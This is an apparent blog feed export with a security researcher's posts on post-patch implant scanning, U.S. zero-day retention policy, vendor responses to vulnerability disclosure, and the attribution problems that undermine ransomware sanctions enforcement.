<span class="n">CN</span><span class="p">:</span> <span class="mi">2</span>  <span class="n">IN</span><span class="p">:</span> <span class="mi">2</span>  <span class="n">DE</span><span class="p">:</span> <span class="mi">2</span>  <span class="n">ZA</span><span class="p">:</span> <span class="mi">2</span>  <span class="n">BH</span><span class="p">:</span> <span class="mi">2</span>
<span class="n">FR</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">ES</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">MY</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">CA</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">TR</span><span class="p">:</span> <span class="mi">1</span>
<span class="n">NL</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">IT</span><span class="p">:</span> <span class="mi">1</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 14: Countries with DSLog implants on February 12th, 2024.</span></p>

<p>After conducting a notification campaign and sharing the information through the appropriate channels, the implants were largely taken down. On April 4th, 2024, there were eight remaining implants. These implants are active to this day.</p>

<h1 id="conclusion-when-fixing-isnt-enough">Conclusion: when fixing isn’t enough</h1>
<p>Patching is a vital part of vulnerability management, but as the case studies in this blog post show, it is no longer sufficient on its own. Persistent backdoors can survive patch windows, quietly operating long after the initial exploit has been closed. If defenders stop looking once the CVE is fixed, they risk missing the real threat: compromise that has already taken root.</p>

<p>Ethical, public-interest scanning helps fill this gap. By focusing on behavioral residues and side channels, we can responsibly detect implants without triggering them and incorporate this into our scanning routines. As vulnerability researchers and incident responders, our responsibility should extend beyond identifying vulnerabilities alone. Finding these implants using responsible methods is part of a broader mission to protect the public interest and support those who may not even realize they are at risk.</p>

<p>This is a reminder that vulnerability response must move beyond the binary of “patched or not” and instead ask the harder question: was the adversary already inside? Until vendors and defenders treat post-patch compromise as a first-class threat model, this work will remain essential—and at times, the only line of defense. Patching closes the door, but unless we check the locks, the intruder may still be inside.</p>]]></content><author><name>Max van der Horst</name><email>mhvanderhorst@tudelft.nl</email></author><category term="Observations on Threat Intelligence" /><summary type="html"><![CDATA[Even after patching, many edge devices remain compromised. This post explores how to ethically scan for backdoors left behind.]]></summary></entry><entry><title type="html">Ready, Retain, Fire? The Quiet Fallout of U.S. Offensive Cyber Policy</title><link href="http://localhost:4000/2025/05/30/us-cyber-policy-zero-day-retention.html" rel="alternate" type="text/html" title="Ready, Retain, Fire? The Quiet Fallout of U.S. Offensive Cyber Policy" /><published>2025-05-30T00:00:00+02:00</published><updated>2025-05-30T00:00:00+02:00</updated><id>http://localhost:4000/2025/05/30/us-cyber-policy-zero-day-retention</id><content type="html" xml:base="http://localhost:4000/2025/05/30/us-cyber-policy-zero-day-retention.html"><![CDATA[<p>Being a CNA administrator means having access to something most people never see: zero-day vulnerabilities. That access comes with responsibility, but also perspective. It’s made me think about how other actors, especially governments, handle this kind of knowledge, and what it means when one side holds a stockpile of vulnerabilities capable of large-scale surveillance or disruption. The U.S. military even <a href="https://cyber.army.mil/News/Article/1325442/stockpiling-zero-day-exploits-the-next-international-weapons-taboo/">considered</a> classifying zero-days as weapons subject to export controls.</p>

<p>I was encouraged to see that some governments have public procedures designed to manage this power transparently. But lately, it feels like that transparency is under pressure.</p>

<p>When the United Kingdom launched the HMS <em>Dreadnought</em> in 1906, it redefined naval warfare. The dreadnought was a warship so advanced, that it wasn’t just a display of power: it was a strategic signal that reshaped expectations. Germany responded by expanding its fleet, triggering a naval arms race rooted less in intent and more in perceived necessity.</p>

<h1 id="the-zero-day-dreadnought">The zero-day dreadnought</h1>

<figure class="figure-float-right">
  <img style="padding:10px; max-width:79%;" src="../../../assets/VEP_Process.png" alt="VEP Process" />
  <figcaption>Figure 1: The VEP Flowchart,<br /> taken from trumpwhitehouse.archives.gov</figcaption>
</figure>

<p>Today, a similar pattern seems to be emerging in the digital realm. As the Trump administration returned in 2025, its cybersecurity strategy is shifting from structured deterrence to a more aggressive, <a href="https://therecord.media/trump-administration-change-the-script-on-offensive-hacking">offense-first approach</a>, aligning with Trump’s <em>Peace Through Strength</em> doctrine. This posture builds on the foundation laid by <a href="https://www.iiss.org/cyber-power-matrix/anticipating-trumps-influence-on-us-cyber-command/">National Security Presidential Memoranda 13 (NSPM-13)</a> in 2018, which loosened interagency controls over offensive cyber operations.</p>

<p>One important, but seemingly overlooked, mechanism to the U.S. offensive cyberpower is the <a href="https://trumpwhitehouse.archives.gov/sites/whitehouse.gov/files/images/External%20-%20Unclassified%20VEP%20Charter%20FINAL.PDF">Vulnerabilities Equities Process (VEP)</a>, which is the Government Disclosure Decision Process (GDDP) used to decide whether to disclose or retain newly discovered zero-day vulnerabilities. While the VEP itself has not formally changed under Trump’s current or previous administrations, it involves significant discretion, particularly in assessing whether disclosure would harm national security. Within a policy environment that is increasingly shaped by offense, there is a growing risk that this discretion may increasingly tilt toward retention.</p>

<p>Though no explicit mandate has been issued, the combination of centralizing authority, reducing transparency, and <a href="https://www.whitehouse.gov/wp-content/uploads/2025/05/Fiscal-Year-2026-Discretionary-Budget-Request.pdf">dismantling oversight mechanisms</a> sends a clear signal to other states: retention is not an exception, it may be becoming the norm. Like the dreadnought, this strategic posture may reset international expectations–not through declaration, but by example.</p>

<h1 id="from-deterrence-to-retention">From deterrence to retention?</h1>
<p>One of the effects of the NSPM-13 was that it streamlined the approval process for offensive cyber operations. This facilitated the <em>Defend Forward</em> doctrine, enabling U.S. Cyber Command to preemptively disrupt threats without explicit presidential approval. While proponents argue this <a href="https://www.cybercom.mil/Media/News/Article/3198878/cyber-101-defend-forward-and-persistent-engagement/">enhances deterrence</a>, research from the Atlantic Council suggests an <a href="https://www.atlanticcouncil.org/programs/cyber-statecraft-initiative/the-proliferation-of-offensive-cyber-capabilities/">overreliance on offensive cyber operations</a> can increase global instability, as adversaries mirror these tactics and <a href="https://www.cato.org/policy-analysis/myth-cyber-offense-case-restraint?#cyber-command-s-new-more-aggressive-policy">see this as provocation</a> instead of deterrence.</p>

<p>The Biden administration adjusted this trajectory by introducing additional checks and transparency mechanisms. However, the first half of 2025 suggests that the second Trump administration may reverse this course. The weakening of oversight mechanisms, such as <a href="https://www.documentcloud.org/documents/25500093-dhs-advisory-boards-termination-letter/">the Cyber Safety Review Board (CSRB)</a>, and the consolidation of decision-making authority within the executive branch indicate a growing emphasis on offensive capability.</p>

<p>This evolution doesn’t come with an explicit declaration that the U.S. is retaining more vulnerabilities. However, the surrounding policy signals–reduced transparency, diminished oversight, and intensified offensive posture–suggest a trend that warrants scrutiny.</p>

<h1 id="strategic-signaling-and-the-dreadnought-effect">Strategic signaling and the dreadnought effect</h1>
<p>Just like the dreadnought reset the bar for naval power, a more opaque and offense-first U.S. cyber doctrine may risk shifting global norms. Vulnerability retention, which was once carefully weighed through the VEP, may increasingly be seen as the default by other nations watching U.S. behavior. This matters because it sends signals, not only to adversaries, but also to allies. Only a few other countries have a GDDP: the <a href="https://www.gchq.gov.uk/information/equities-process">United Kingdom</a> and <a href="https://www.aivd.nl/onderwerpen/onbekende-kwetsbaarheden#:~:text=Kwetsbaarheid%20melden%2C%20tenzij…&amp;text=Hiervoor%20geldt%20het%20beleid%3A%20'melden,(voorlopig)%20niet%20te%20melden.">the Netherlands</a> have a defined GDDP, and Germany has explored a GDDP since 2018, but has not implemented a formal process to date. Because GDDPs are self-imposed constraints, most countries seem to have not prioritized their development or public debate. If the U.S. treats vulnerabilities as strategic assets rather than shared risks, other governments may feel compelled to follow its lead. Even those working to strengthen Coordinated Vulnerability Disclosure (CVD), such as the European Union through the Cyber Resilience Act and the NIS2 Directive, could face internal pressure to reassess their approach. In the end, a GDDP is a way for states to impose accountability on themselves. Without such a process, states may retain greater flexibility, but at the cost of reduced transparency.</p>

<blockquote>
  <p>The <strong>dreadnought effect</strong> refers to the unintended consequences of a dominant power’s strategic innovation resetting international norms. Named after HMS Dreadnought, a revolutionary British battleship launched in 1906, the term describes how a single state’s advancement can pressure others to escalate—even if they had no initial desire to do so. In cybersecurity, the metaphor applies to how shifts in U.S. offensive posture may lead other nations to change their own vulnerability disclosure strategies, simply to maintain parity.</p>
</blockquote>

<h1 id="the-narrow-corridor-and-the-red-queen-effect">The narrow corridor and the red queen effect</h1>
<p><a href="https://www.penguinrandomhouse.com/books/555400/the-narrow-corridor-by-daron-acemoglu-and-james-a-robinson/">Acemoglu and Robinson’s <em>Narrow Corridor</em></a> frames healthy governance as a balance between state power and societal oversight. In this model, both must evolve jointly, providing equal pressure to one another. If one accelerates while the other stagnates, the system risks slipping into authoritarian overreach or institutional weakness.</p>

<p>A GDDP shaped by secrecy, unchecked executive power, and offensive priorities can threaten that balance. The VEP has already <a href="https://www.zetter-zeroday.com/u-s-government-disclosed-39-zero-day-vulnerabilities-in-2023-per-first-ever-report/">faced criticism</a> for a perceived lack of transparency, as reflected in the <a href="https://www.wyden.senate.gov/imo/media/doc/fy23_unclassified_vep_annual_reportpdf.pdf">ODNI’s first public disclosure report</a> on retained and disclosed vulnerabilities. The criticism highlights the need for greater public insight into the VEP to determine whether it genuinely prioritizes defense over offense, something recent developments appear to contradict. The public is losing insight into how vulnerabilities are handled, while the private sector–which is often on the frontlines of cyberattacks–is left in the dark. This lack of transparency further erodes accountability, which again reinforces a shift towards cyber power centralization within the executive branch.</p>

<p>In the case of the United States, this trajectory is a textbook example of something larger. The Narrow Corridor describes the concept of a <em>Despotic Leviathan</em>(originating from Hobbes’ <em>Leviathan</em>), where unchecked state control weakens security and liberty. With the removal of oversight mechanisms and consolidation of cybersecurity authority, the Trump administration risks prioritizing short-term strategic advantages over long-term resilience, ultimately weakening U.S. cybersecurity. This concern is particularly important in light of the current <a href="https://www.politico.com/news/magazine/2025/01/28/trump-tiktok-bailout-00200800">congressional inaction</a> and the <a href="https://time.com/7210420/justice-department-fires-employees-prosecutions-trump/">removal of government officials</a> involved in Trump’s criminal prosecution, further undermining institutional checks and balances.</p>

<p>This is where the <em>Red Queen</em> concept from the Narrow Corridor becomes relevant. To stay secure, both the state and society must run to remain in the “narrow corridor”. By actively sidelining society’s oversight role, the Trump administration disrupts this balance, undermining the reciprocal strengthening that supports resilient governance, robust cybersecurity, and civil liberty.</p>

<h1 id="consequences-and-global-shifts">Consequences and global shifts</h1>
<ul>
  <li><strong>Allies may feel compelled to retain:</strong> U.S. posture may inadvertently pressure other countries to deprioritize disclosure, even if it contradicts their public policy.</li>
  <li><strong>Private sector is left exposed:</strong> Coordinating large-scale vulnerability disclosures has shown me just how far the ripples from a single flaw can reach. When retained vulnerabilities leak (or worse, when no one knows they exist), the fallout isn’t theoretical. A great example is EternalBlue: originally retained by the NSA, it was later leaked and exploited in the WannaCry and NotPetya attacks, which were two of the most disruptive cybersecurity incidents in recent history. These attacks weren’t launched by state actors, but by criminal and proxy groups.</li>
  <li><strong>Norms begin to fracture:</strong> The idea of disclosure as responsible security weakens when strategic ambiguity dominates global cyber policy.</li>
</ul>

<h1 id="conclusion-rediscovering-the-corridor">Conclusion: rediscovering the corridor</h1>
<p>Zero-day vulnerabilities are not just technical artifacts, they are instruments of policy. While the U.S. has not explicitly stated it is retaining more vulnerabilities, its broader cyber strategy sends signals that may shift global expectations.</p>

<p>Like the dreadnought before World War I, offensive cyber capability can reset norms in dangerous ways. To remain in the Narrow Corridor, the U.S. should lead by example: strengthening oversight, maintaining transparency, and upholding vulnerability disclosure as a pillar of cyber resilience.</p>

<p>From where I stand, real strength doesn’t lie in how many vulnerabilities are kept, but in what is disclosed, when, and why. That’s the foundation of trust–and trust, <a href="https://archive.org/details/kerckhoffs.translated.pdf">not secrecy</a>, is what makes the internet more secure.</p>]]></content><author><name>Max van der Horst</name><email>mhvanderhorst@tudelft.nl</email></author><category term="Vulnerability Disclosure" /><category term="Cybersecurity Policy &amp; Ethics" /><summary type="html"><![CDATA[When one nation hoards weapons, others feel compelled to follow. The U.S. posture on zero-day retention risks global insecurity through a dynamic we've seen before.]]></summary></entry><entry><title type="html">What You Hide Will Hurt You: The Streisand Effect of Zero-Day Vulnerabilities</title><link href="http://localhost:4000/2025/05/24/what-you-hide-will-hurt-you-zero-day-vulnerabilities.html" rel="alternate" type="text/html" title="What You Hide Will Hurt You: The Streisand Effect of Zero-Day Vulnerabilities" /><published>2025-05-24T00:00:00+02:00</published><updated>2025-05-24T00:00:00+02:00</updated><id>http://localhost:4000/2025/05/24/what-you-hide-will-hurt-you-zero-day-vulnerabilities</id><content type="html" xml:base="http://localhost:4000/2025/05/24/what-you-hide-will-hurt-you-zero-day-vulnerabilities.html"><![CDATA[<p>When I first became a CVE Numbering Authority (CNA) administrator at DIVD, I assumed most software vendors would welcome a heads-up about critical vulnerabilities in their products. We’re not selling zero-days, we’re helping these vendors remediate them. However, over time, I learned a strange truth: many vendors would rather silence the messenger than fix the message. From legal threats to ostrich politics, the instinct to cover-up a zero-day vulnerability runs deep. Ironically, it’s this reaction (rather than the vulnerability itself) that often causes the most reputational damage. What you hide will hurt you. And in cybersecurity, few things backfire harder than trying to bury insecurity.</p>

<h1 id="life-as-a-cna-administrator">Life as a CNA administrator</h1>
<p>CNAs are organizations authorized by the <a href="https://cve.mitre.org">CVE Program</a> to assign CVE IDs to newly discovered vulnerabilities and publish related details. CNAs are the backbone of the distributed vulnerability reporting system that powers CVE. They can be software vendors, coordination centers, bug bounty platforms, or, like DIVD, security research groups.</p>

<p>Being a CNA administrator at DIVD means acting as a trusted intermediary in the vulnerability disclosure process. Specifically, DIVD is designated as a Research CNA: a type of CNA authorized to assign CVE IDs for vulnerabilities discovered through its own independent security research. Unlike vendor CNAs, which typically cover the security of their own products, Research CNAs do not need to be the creator or maintainer of the affected software and do not rely on vendor permission to assign a CVE. As a Research CNA administrator, we receive vulnerability reports, validate them, coordinate with the vendors where possible, and publish CVE records when Coordinated Vulnerability Disclosure processes have followed through. This role is about much more than just managing identifiers though, it’s about navigating technical, ethical, and sometimes political terrain.</p>

<p>At DIVD, our approach is public-interest driven: typically we are of the opinion that the public has the right to know about a security issue in the software they use. After all, it may affect them personally and they have the right to decide whether or not they want to continue using this software. Therefore, after making sure we have successfully coordinated a disclosure and a remediation has been issued, we also tend to seek out people that are still affected by the vulnerability in order to warn them. The first step in doing this is always to coordinate a disclosure with the vendor, otherwise we end up resorting to disproportionate methodology as is <a href="https://disclosing.observer/2025/05/10/unsolicited-vulnerability-disclosure-ethics.html">extensively discussed in my article on disclosure ethics</a>. Our mission is clear, but the path isn’t always smooth. Some vendors cooperate openly, understanding the value of transparency and early warnings. Others treat our contact as a threat instead of a courtesy, despite the fact that we’re offering voluntary help, not blame.</p>

<p>Over time, this role teaches you something about organizational maturity, communication under pressure, and how reputations are built (or broken) in the way vendors respond to bad news.</p>

<p><img src="../../../assets/CNA-workflow.svg" alt="" class="centered-img" />
<span class="centered-text">Figure 1: CNA workflow</span></p>

<h1 id="the-playbook-of-avoidance">The playbook of avoidance</h1>
<p>Not all companies react the same way to a vulnerability disclosure. Some respond with a clear acknowledgement, quick triage, and a patch timeline. Others will stall, deny, escalate to legal teams, or straight up ignore you hoping to demoralize so that you give up. All of this happens before anyone technical has even looked at the report. These tactics aren’t just frustrating, they’re risky. In the case of some critical vulnerabilities, the time to patch needs to be as short as possible. Every delay increases the window of exploitation and, paradoxically, draws more attention when the issue finally surfaces.</p>

<p>Earlier this year we handled a report that shows just how long some vendors will try to wait you out. An independent researcher, now a member of DIVD, had uncovered a set of high-severity vulnerabilities in a software product widely used by government agencies in one particular country. He had been emailing the vendor, politely and persistently, since 2022. He had received no response. Once the report reached DIVD we re-validated the bugs and started our standard outreach: attempts to contact by phone, email, and LinkedIn. Three months passed, after which we requested that this country’s national CSIRT relay the warning. They, too, were met with radio silence. With 90 days gone and no progress, we published a limited disclosure that included the newly assigned CVE IDs and the advice to not use this product anymore due to the fundamental design weaknesses. Within twenty-four hours, the vendor surfaced: not with a remediation plan, but with a complaint that they “did not want their customers to know about these issues” and that they “wanted the publication taken down”. This is a perfect example of the <em>ignore-until-it-hurts</em> tactic: three years of quiet, private nudging produced nothing; one short public notice produced an immediate, though still defensive, response.</p>

<p>This is why we tend to alert vendors that we are sticking to <a href="https://csirt.divd.nl/cna/">our own written CNA procedure</a>. This procedure is based on the <a href="https://english.ncsc.nl/publications/publications/2019/juni/01/coordinated-vulnerability-disclosure-the-guideline">Coordinated Vulnerability Disclosure guideline</a> by the Dutch National Cyber Security Center (NCSC-NL). This guideline discusses the general consensus that a 60-day window should be sufficient to fix most software vulnerabilities. Hardware vulnerabilities should take longer and have a 180-day window. Of course, as long as a vendor is communicating openly about their progress, we will not be stringent about this. However, we are not afraid to use this as a tool to leverage a response and ultimately inform the public about the (at that point still unpatched) vulnerability. We will do this through a so-called limited disclosure and product warning. Vendors get to deliver input on the framing of any publications as we do not move towards this type of last resort, making it clearly in their best interest to collaborate and take responsibility. In the end, limited disclosures that contain the information that a vendor was not available for response or remediation do not look good.</p>

<h1 id="the-role-of-the-security-industry-in-this-mess">The role of the security industry in this mess</h1>
<p>But let’s be honest: part of the problem may be the cybersecurity industry as a whole. We have created some of the very incentives that make vendors want to hide their flaws. For years, we’ve treated the number of CVEs associated with a vendor as a scoreboard for vulnerability. Many practitioners still do. Think report headlines like <em>Top 10 Most Vulnerable Vendors This Year</em>. What does a high CVE count say to the public? Poor security. Broken systems. Incompetence.</p>

<p>In reality, it’s often the opposite. A high number of CVEs can signal maturity of the vulnerability management processes within an organization: people are looking, problems are being fixed, and the system is transparent enough to document it. That’s a sign of a functioning security posture rather than a failing one. For example, in 2024, the <a href="https://www.cvedetails.com/top-50-vendors.php?year=2024">top vendor with distinct vulnerabilities registered as CVEs </a> was <em>Linux</em> with 3874 CVE IDs. The Linux community is likely one of the most security-aware ones out there, which is partially why they keep finding new issues that are then registered as CVEs. When we shame companies for having vulnerabilities, which is something that happens to the best of us, we create incentives for censorship. That’s on us. If disclosure is to work, we have to stop treating visibility as guilt. At this point, one could even say that it is suspicious when a vendor does not have any claimed CVE IDs or otherwise published vulnerabilities.</p>

<h1 id="when-the-cover-up-becomes-the-story">When the cover-up becomes the story</h1>
<p>Here’s the thing about unresolved limited disclosures: most vulnerabilities don’t become front-page news on their own. What gets remembered, and what is reported, is how a company handles the situation once it becomes aware of the problem. In many cases, the vulnerability itself isn’t what harms a company’s reputation. It’s the response.</p>

<p>Obstructing disclosure, delaying patches, trying to silence or ignore researchers. It creates a second story: one that says they don’t take security seriously. That second story spreads faster and sticks longer. Public shaming often follows obstruction, in contrast to the belief of some of these vendors that having to publish CVE IDs will tarnish their reputation. Media and researchers take note of silence and hostility. Customers, partners, and regulators may start asking questions. The issue inevitably becomes public, but now with a damaging narrative: lack of transparency and accountability. A great example of this is <a href="https://www.cnbc.com/2020/04/02/zoom-ceo-apologizes-for-security-issues-users-spike-to-200-million.html">the repeated security issues with videoconferencing software Zoom</a>, in which the vendor was aware of various vulnerabilities that were discovered by the public. Because of the vulnerabilities, the publicity it received, and the (lack of) response by the company behind Zoom, various large companies like NASA and SpaceX <a href="https://www.zdnet.com/article/zoom-were-freezing-all-new-features-to-sort-out-security-and-privacy/">banned the use of Zoom altogether</a>, setting an important precedent.</p>

<p>That’s the Zero-Day Streisand effect. The more you try to hide the problem, the more visible and damaging it becomes.</p>

<h1 id="what-good-looks-like">What good looks like</h1>
<p>Far from all responses are defensive or hostile. There are plenty of companies I’ve worked with that handle disclosures with transparency, speed, and professionalism. The contrast is absolutely striking. These are the organizations that take action within hours, thank us for the report, and keep us in the loop on remediation progress. They prioritize patching the issue, even when it’s inconvenient. Some even take it a step further by publishing advisories, calling customers, publicly crediting the researcher, and using the opportunity to show their commitment to security.</p>

<p>These companies don’t just fix bugs, they build trust. Ironically, some of the best reputations I’ve seen were forged in the heat of a serious vulnerability. Because when you handle bad news well, it says something powerful in my opinion: you’re not perfect, but you’re responsible. Companies that respond constructively earn real credibility, even when the vulnerability is a serious one. A result of this is that potential PR hits are turned into a trust-building moment both internally and externally. They signal that they take their security seriously, and this is what their customers (and employees) remember.</p>

<h1 id="conclusion-transparency-is-the-real-fix">Conclusion: transparency is the real fix</h1>
<p>Every product has vulnerabilities. That’s not the issue. The issue is whether you fix them, or spend your valuable time fighting the people that try to help you do so. Trying to hide zero-day vulnerabilities doesn’t protect a brand. It fractures trust. Once the cover-up becomes the story, you’ve lost control of the narrative. The Streisand Effect takes over.</p>

<p>Security isn’t about being flawless. It’s about being accountable. We need to stop punishing companies for being transparent, and this is an upcoming trend I am very happy to see. We need to recognize and reward taking the right steps when things become difficult. This is because in the long run, what you hide will hurt you.</p>]]></content><author><name>Max van der Horst</name><email>mhvanderhorst@tudelft.nl</email></author><category term="Vulnerability Disclosure" /><summary type="html"><![CDATA[Most vulnerabilities never make headlines; botched disclosures do. Trying to muzzle researchers doesn’t shrink risk, it spotlights it.]]></summary></entry><entry><title type="html">The Ransomware Blame Game: Who Bears the Burden of Sanction Enforcement?</title><link href="http://localhost:4000/2025/05/17/ransomware-blame-game.html" rel="alternate" type="text/html" title="The Ransomware Blame Game: Who Bears the Burden of Sanction Enforcement?" /><published>2025-05-17T00:00:00+02:00</published><updated>2025-05-17T00:00:00+02:00</updated><id>http://localhost:4000/2025/05/17/ransomware-blame-game</id><content type="html" xml:base="http://localhost:4000/2025/05/17/ransomware-blame-game.html"><![CDATA[<p>When I worked in a Computer Emergency Response Team (CERT), ransomware cases were part of the routine. A company would be hit, backups failed, and the question of ransom payment would come up. Every so often, the team would offer the option of a sanction checking service to verify whether payment was even legal. However, these sanction checks would depend on indicators like cryptocurrency wallet addresses, file hashes, IP addresses, and domain names. These were all indicators that were known to be volatile, so I wondered: <em>how effective is this really?</em>.</p>

<p>These checks felt necessary but rarely brought clarity. Infrastructure changed constantly. Attribution was fragile and full of assumptions, and the same group might be known under a different name next week. Even when the style of a ransomware operation was recognized, it didn’t guarantee that we could connect it to a known actor. The attacker would disappear after the ransom payment, but the legal and financial risk remained, now shifted onto the victim.</p>

<p>That discomfort stuck with me. So when I had the opportunity to start working on <a href="https://www.usenix.org/conference/usenixsecurity25/presentation/van-der-horst">the paper this post is based on</a>, it wasn’t just about the fragility of different Indicators of Compromise (IoCs). 	It was about something deeper: what happens when policy assumes a level of certainty that defenders simply don’t have? This blogpost is an extension of the USENIX paper: a reflection on how our current enforcement and compliance frameworks place responsibility on those with the least access to reliable information. It is not a call to weaken sanctions policy, but a call to make it more just. If sanctions are meant to constrain attackers, then enforcement must be designed to reach them–not to retroactively penalize the victims.</p>

<h1 id="the-limits-of-technical-attribution">The limits of technical attribution</h1>
<p>In Threat Intelligence, attribution is a layered process. <em>Low-level IoCs</em>, pieces of evidence related to infrastructure, the attack, payment methods, and other operational details, are easy to collect and useful for detection. However, they are extremely volatile. These indicators can be changed with little effort by attackers, making them poor foundations for long-term attributions. This idea has been confirmed by frameworks like Bianco’s <a href="https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html">Pyramid of Pain</a> and Rid and Buchanan’s <a href="https://cs.brown.edu/courses/cs180/sources/Attributing_Cyber_Attacks.pdf">Q-Model</a>.</p>

<p>Hence, it seems irresponsible to base sanctions lists on these low-level indicators, which is why the paper behind this post investigates the value of <em>high-level IoCs</em>. By contrast, high-level IoCs capture behavioral traits such as how attackers deploy their malware, how they move laterally, ransom note linguistics, negotiation attitudes, and Tactics, Techniques, and Procedures (TTPs). Both models agree that high-level indicators are more resilient to evasion and thus more trustworthy across rebrandings.</p>

<p><img src="../../../assets/models.png" alt="" class="centered-img" />
<span class="centered-text">Figures 1 &amp; 2: The Pyramid of Pain and the Q-Model</span></p>

<h2 id="the-affiliate-wild-card">The affiliate wild-card</h2>
<p>Many ransomware operations follow an affiliate model known as Ransomware-as-a-Service (RaaS), in which core developers lease their tools to independent partners. These affiliates vary widely in skill and methods, and while operators often provide deployment guidelines, affiliates may diverge from them in practice. As a result, high-level indicators, such as lateral movement techniques or tooling preferences, can differ significantly even within the same group, adding noise to attribution efforts.</p>

<h2 id="observations-from-the-paper">Observations from the paper</h2>
<p>We analysed datasets containing information on ransomware incidents: 27 private incident reports from an incident response company and 13 public CISA advisories based on various other incident response organizations. Two findings stood out from this data:</p>

<figure class="figure-float-right">
  <img src="../../../assets/radar-chart-overlap-sim.png" alt="Radar chart" />
  <figcaption>Figure 3: Similarity metrics across ransomware groups</figcaption>
</figure>

<ul>
  <li><strong>Inside a single “brand,” the technical overlap was surprisingly low.</strong> Different incidents linked to the same group often shared fewer than half their TTPs.</li>
  <li><strong>Across sources, the overlaps became even lower.</strong> What CISA published and what the responders from our partnering company observed for the same group only line up part of the time. This shows a significant discrepancy between the reporting of different organizations, which undermines the assumption that defenders (or regulators) have access to a consistent view of attacker behaviour at the time sanctions checks are performed.</li>
</ul>

<p>In short, the low-level indicators that sanctions lists currently lean on tend to expire quickly, while no one seems to have a comprehensive overview of the behavioural high-level indicators. While this dataset is of course not exhaustive, the consistency of these patterns across both public and private reporting streams underscores their broader relevance.</p>

<h2 id="why-this-matters-for-sanctions">Why this matters for sanctions</h2>
<p>Yet, most compliance frameworks, and even some insurance policies, continue to rely on indicators that appear to uniquely identify a ransomware group. This is an understandable position: enforcement systems require clear identifiers to function. However, this expectation favors indicators that are easily assigned over indicators that are more stable but less individually distinctive.</p>

<p>As a result, and as confirmed by our interviewees, high-level behavioural indicators are often excluded from compliance checks, not because they are unreliable, but because they lack the singularity needed to support legal or financial action. Sanctions enforcement, therefore, depends on low-level indicators not due to their robustness, but because they are uniquely attributable. This is true even when those same indicators can be changed by attackers with minimal effort.</p>

<p>Until enforcement frameworks find a way to operationalise high-level signals across rebrandings, defenders will have to deal with indicators that are known to change rapidly. In practice, this means working with the most accessible signals, not the most meaningful ones.</p>

<h1 id="rebranding-as-a-sanctions-evasion-strategy">Rebranding as a sanctions-evasion strategy</h1>
<p>Ransomware groups don’t stay still. After public exposure, <a href="https://www.cisecurity.org/insights/blog/the-conti-leaks-a-case-of-cybercrimes-commercialization">internal conflict</a>, or sanctions, many simply dissolve and rebrand under a new name. The infamous Conti group, for instance, splintered into <a href="https://www.hhs.gov/sites/default/files/blacksuit-ransomware-analyst-note-tlpclear.pdf">several new entities</a>, including Royal and then BlackSuit, among others. These new groups often adopt new infrastructure, names, leak sites, and negotiation portals, but retain (some of) the same personnel, malware toolchains, and affiliate relationships.</p>

<p>This rebranding breaks the link between old and new entities in legal and public intelligence contexts. While threat researchers may recognize the continuity, governments may typically require formal evidence of control or ownership to link a new group to a sanctioned predecessor. That process is slow, often opaque, and rarely public. Months can pass before rebranded groups are re-sanctioned, during which victims remain legally exposed.</p>

<p>Victims, meanwhile, are expected to know better. If they pay a ransom to a group that is later tied to a sanctioned actor, they may be penalized, even if the link was not publicly known at the time of payment. Various interviewees in the study mentioned this to be a great risk to the victim, as insurers can (and will) try to claw back a paid-out ransom months later if the recipient is sanctioned after the fact, effectively retro-dating the exclusion to the payment date. Moreover, the moment a ransomware group is sanctioned, it may trigger a rebrand, further obfuscating the public overview. This is the heart of the policy asymmetry: ransomware groups can easily obscure their identities whereas defenders and victims are expected to see through the smoke.</p>

<h1 id="the-information-deficit-and-the-burden-of-compliance">The information deficit and the burden of compliance</h1>
<p>This means that the position that a victim of ransomware finds themselves in can be framed as an information deficit. The entities responsible for enforcing compliance, such as governments, regulators, and insurers, operate on the assumption that attribution is clear and actionable. However, in ransomware cases, attribution is often incomplete, delayed, or ambiguous.</p>

<p>The ransomware cases we’ve analyzed in our study show that low-level indicators rarely persisted across incidents, let alone rebrandings. In several cases, ransom payments were made to groups not publicly sanctioned at the time, only for links to sanctioned actors to emerge through later intelligence analysis. These links often relied on high-level behavior indicators like linguistics, panel design reuse, or TTPs, which were absent from standard sanction checks.</p>

<p>This creates a <em>critical gap</em>: compliance decisions are expected to be based on indicators that are technically available but operationally unreliable. Meanwhile, indicators that could offer stronger attribution are often not included in threat feeds or sanctions designations, and are not legally recognized as sufficient evidence. Furthermore, because of phenomena like the Ransomware-as-a-Service (RaaS) ecosystem, slight deviations in reporting using frameworks like the <a href="https://attack.mitre.org">MITRE ATT&amp;CK Matrix</a>, and the commercialisation of the Threat Intelligence industry, data is so fragmented that no single organization appears to have a comprehensive view of high-level indicators, making coordinated enforcement even more difficult. This also means that even when TTP combinations appear distinctive on paper, the fragmentation and inconsistency across sources make them impractical for real-world sanctions checks.</p>

<p>In practice, this means that defenders may act in good faith based on the best available data and still find themselves in violation of compliance expectations. While European countries are typically more forgiving than the U.S. by taking into account their <a href="https://finance.ec.europa.eu/document/download/65560de8-a13a-4a58-a87c-ddd27b14e6c1_en?filename=faqs-sanctions-russia-best-efforts-obligation_en.pdf"><em>Best Efforts regulation</em></a>, payment to a sanctioned entity still opens up a victim to legal or financial consequences. 	Several European and American cyber-insurance wordings now not only <a href="https://assets.lloyds.com/media/47dd9b48-e881-4169-8a98-8d305a1d6fce/Y5359.pdf">exclude reimbursement for ransoms that benefit a sanctioned party</a>, but also reserve the right to <a href="https://cilj.law.uconn.edu/wp-content/uploads/sites/2520/2022/04/Ransomware-Kenneally-CILJ-Vol.-28.1.pdf"><strong>recover a payout after the fact</strong></a> if new intelligence or a late-issued designation reveals that the attackers were sanctioned. Retroactive enforcement of these exclusions, whether via contract or regulation, shifts the risk back onto those least equipped to verify attribution in real time: the victims.</p>

<h1 id="structural-asymmetry-in-ransomware-enforcement">Structural asymmetry in ransomware enforcement</h1>
<p>The outcome is a deeply asymmetrical system. Attackers operate in a fluid, pseudonymous ecosystem. Defenders operate under legal obligations, audit trails, and policy scrutiny. Compliance rules are often applied rigidly. Not only by governments, but increasingly by cyber insurers, even when the available indicators are ambiguous.</p>

<p>Our research calls attention to this structural misalignment. It is not simply a technical issue, but a policy failure. By placing the burden of accurate attribution on defenders, we ignore the reality that attribution is contested and delayed, even among experts.</p>

